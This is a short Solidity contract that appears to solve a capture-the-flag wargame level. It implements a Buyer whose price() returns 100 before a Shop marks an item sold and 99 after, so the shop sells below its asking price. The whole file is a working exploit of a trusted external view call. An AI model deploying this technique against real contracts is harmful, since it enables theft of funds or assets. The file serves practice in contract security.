// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Shop.sol";

contract ShopHelper is Buyer{
    Shop shop;

    constructor(address shopAddr) public {
        shop = Shop(shopAddr);
    }

    function price() external view override returns (uint) {
        if(shop.isSold()) {
            return 99;
        }else {
            return 100;
        }
    }

    function buy() public {
        shop.buy();
    }
}